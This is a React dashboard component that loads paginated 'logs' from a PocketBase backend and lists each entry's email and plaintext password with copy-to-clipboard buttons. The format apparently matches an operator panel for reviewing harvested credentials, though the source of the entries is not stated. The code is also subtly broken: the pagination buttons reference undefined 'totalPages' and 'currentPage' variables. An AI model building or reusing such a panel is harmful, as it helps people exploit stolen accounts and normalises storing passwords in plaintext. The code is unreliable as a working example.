import { useAuth } from "../context/AuthContext";
import { fetchLogs } from "../services/pocketbase";
import { useState, useEffect } from "react";

export default function Dashboard() {
  const { auth, logout, updateLogs } = useAuth();
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  useEffect(() => {
    if (auth.isAuthenticated) {
      loadLogs(auth.currentPage);
    }
  }, [auth.currentPage, auth.isAuthenticated]);
  const loadLogs = async (page) => {
    try {
      setIsLoading(true);
      setError(null);
      const response = await fetchLogs(page);
      console.log("Fetched logs:", response.items); // Debug log
      updateLogs(
        response.items,
        response.totalPages,
        response.totalItems,
        page
      );
    } catch (err) {
      console.error("Error loading logs:", err); // Debug log
      setError(err.message);
    } finally {
      setIsLoading(false);
    }
  };

  // Format date safely
  const formatDate = (dateString) => {
    try {
      return dateString ? new Date(dateString).toLocaleString() : "No date";
    } catch (err) {
      return "Invalid date";
    }
  };
  const [copiedField, setCopiedField] = useState(null);

  const copyToClipboard = (text, fieldId) => {
    navigator.clipboard.writeText(text);
    setCopiedField(fieldId);
    setTimeout(() => setCopiedField(null), 2000); // Reset after 2 seconds
  };
  const CopyButton = ({ text, fieldId }) => (
    <button
      onClick={() => copyToClipboard(text, fieldId)}
      className={`ml-2 p-1 rounded-md transition-colors ${
        copiedField === fieldId
          ? "text-green-500 bg-green-50"
          : "text-gray-400 hover:text-indigo-600 hover:bg-indigo-50"
      }`}
      title="Copy to clipboard"
    >
      {copiedField === fieldId ? (
        <svg
          className="h-4 w-4"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            strokeLinecap="round"
            strokeLinejoin="round"
            strokeWidth={2}
            d="M5 13l4 4L19 7"
          />
        </svg>
      ) : (
        <svg
          className="h-4 w-4"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            strokeLinecap="round"
            strokeLinejoin="round"
            strokeWidth={2}
            d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"
          />
        </svg>
      )}
    </button>
  );

  const renderLogItem = (log) => {
    if (!log || !log.id) return null;

    return (
      <li key={log.id} className="px-4 py-4 sm:px-6 hover:bg-gray-50">
        <div className="flex items-center justify-between">
          <div className="flex-grow">
            <div className="grid grid-cols-2 gap-4">
              {/* Email Section */}
              <div className="space-y-1">
                <div className="text-xs font-medium text-gray-500 uppercase">
                  Email
                </div>
                <div className="flex items-center">
                  <span className="text-sm font-medium text-indigo-600">
                    {log.email || "No email"}
                  </span>
                  <CopyButton text={log.email} />
                </div>
              </div>

              {/* Password Section */}
              <div className="space-y-1">
                <div className="text-xs font-medium text-gray-500 uppercase">
                  Password
                </div>
                <div className="flex items-center">
                  <span className="text-sm font-medium text-indigo-600">
                    {log.password || "No password"}
                  </span>
                  <CopyButton text={log.password} />
                </div>
              </div>
            </div>

            {/* Description and Date */}
            <div className="mt-2 flex items-center justify-between">
              <div className="text-sm text-gray-500">
                {log.description || "No description"}
              </div>
              <div className="text-xs text-gray-400">
                {formatDate(log.created)}
              </div>
            </div>
          </div>
        </div>
      </li>
    );
  };
  const handlePageChange = (newPage) => {
    loadLogs(newPage);
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const PaginationButton = ({ page, isActive, onClick, disabled }) => (
    <button
      onClick={onClick}
      disabled={disabled}
      className={`${
        isActive
          ? "bg-indigo-600 text-white"
          : "bg-white text-gray-500 hover:bg-gray-50"
      } relative inline-flex items-center px-4 py-2 text-sm font-medium border ${
        disabled ? "opacity-50 cursor-not-allowed" : ""
      }`}
    >
      {page}
    </button>
  );

  const renderPaginationButtons = () => {
    const buttons = [];
    const maxVisiblePages = 5;
    let startPage = Math.max(
      1,
      auth.currentPage - Math.floor(maxVisiblePages / 2)
    );
    let endPage = Math.min(auth.totalPages, startPage + maxVisiblePages - 1);

    if (endPage - startPage + 1 < maxVisiblePages) {
      startPage = Math.max(1, endPage - maxVisiblePages + 1);
    }

    // Previous button
    buttons.push(
      <button
        key="prev"
        onClick={() => handlePageChange(auth.currentPage - 1)}
        disabled={auth.currentPage === 1}
        className="relative inline-flex items-center px-3 py-2 text-sm font-medium text-gray-500 bg-white border rounded-l-md hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed"
      >
        <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
          <path
            fillRule="evenodd"
            d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z"
            clipRule="evenodd"
          />
        </svg>
      </button>
    );

    // First page if not visible
    if (startPage > 1) {
      buttons.push(
        <PaginationButton
          key={1}
          page={1}
          isActive={auth.currentPage === 1}
          onClick={() => handlePageChange(1)}
        />
      );
      if (startPage > 2) buttons.push(<span key="dots1">...</span>);
    }

    // Numbered pages
    for (let i = startPage; i <= endPage; i++) {
      buttons.push(
        <PaginationButton
          key={i}
          page={i}
          isActive={auth.currentPage === i}
          onClick={() => handlePageChange(i)}
        />
      );
    } // Last page if not visible
    if (endPage < auth.totalPages) {
      if (endPage < auth.totalPages - 1)
        buttons.push(<span key="dots2">...</span>);
      buttons.push(
        <PaginationButton
          key={auth.totalPages}
          page={auth.totalPages}
          isActive={auth.currentPage === auth.totalPages}
          onClick={() => handlePageChange(totalPages)}
        />
      );
    }

    // Next button
    buttons.push(
      <button
        key="next"
        onClick={() => handlePageChange(currentPage + 1)}
        disabled={currentPage === totalPages}
        className="relative inline-flex items-center px-3 py-2 text-sm font-medium text-gray-500 bg-white border rounded-r-md hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed"
      >
        <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
          <path
            fillRule="evenodd"
            d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
            clipRule="evenodd"
          />
        </svg>
      </button>
    );

    return buttons;
  };

  return (
    <div className="min-h-screen bg-gray-100">
      <nav className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16">
            <div className="flex items-center">
              <h1 className="text-xl font-semibold">Dashboard</h1>
            </div>
            <div className="flex items-center">
              <span className="mr-4">Welcome, {auth.email}</span>
              <button
                onClick={logout}
                className="bg-indigo-600 text-white px-4 py-2 rounded-md text-sm font-medium hover:bg-indigo-700"
              >
                Logout
              </button>
            </div>
          </div>
        </div>
      </nav>

      <main className="max-w-7xl mx-auto py-6 sm:px-6 lg:px-8">
        <div className="px-4 py-6 sm:px-0">
          {isLoading ? (
            <div className="flex items-center justify-center h-96">
              <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-indigo-600"></div>
            </div>
          ) : error ? (
            <div className="bg-red-50 border-l-4 border-red-400 p-4 h-96 flex items-center justify-center">
              <div className="flex flex-col items-center space-y-4">
                <svg
                  className="h-12 w-12 text-red-400"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                  />
                </svg>
                <p className="text-lg font-medium text-red-800">
                  Error loading logs
                </p>
                <p className="text-red-600">{error}</p>
                <button
                  onClick={loadLogs}
                  className="mt-4 px-4 py-2 bg-red-100 text-red-700 rounded-md hover:bg-red-200 transition-colors"
                >
                  Try Again
                </button>
              </div>
            </div>
          ) : (
            <div className="space-y-4">
              <div className="bg-white shadow rounded-lg overflow-hidden">
                <div className="px-4 py-5 sm:px-6 flex justify-between items-center">
                  <div>
                    <h3 className="text-lg leading-6 font-medium text-gray-900">
                      Activity Logs
                    </h3>{" "}
                    <p className="mt-1 max-w-2xl text-sm text-gray-500">
                      Showing {auth.logs.length} of {auth.totalItems} entries
                    </p>
                  </div>
                </div>
                <div className="border-t border-gray-200">
                  <ul className="divide-y divide-gray-200">
                    {auth.logs.length === 0 ? (
                      <li className="px-4 py-12">
                        <div className="text-center">
                          <svg
                            className="mx-auto h-12 w-12 text-gray-400"
                            fill="none"
                            viewBox="0 0 24 24"
                            stroke="currentColor"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"
                            />
                          </svg>
                          <p className="mt-2 text-sm text-gray-500">
                            No logs found
                          </p>
                        </div>
                      </li>
                    ) : (
                      auth.logs.map(renderLogItem)
                    )}
                  </ul>
                </div>
              </div>

              {/* Pagination */}
              {auth.totalPages > 1 && (
                <div className="flex items-center justify-center space-x-1 bg-white px-4 py-3 rounded-lg shadow">
                  {renderPaginationButtons()}
                </div>
              )}
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
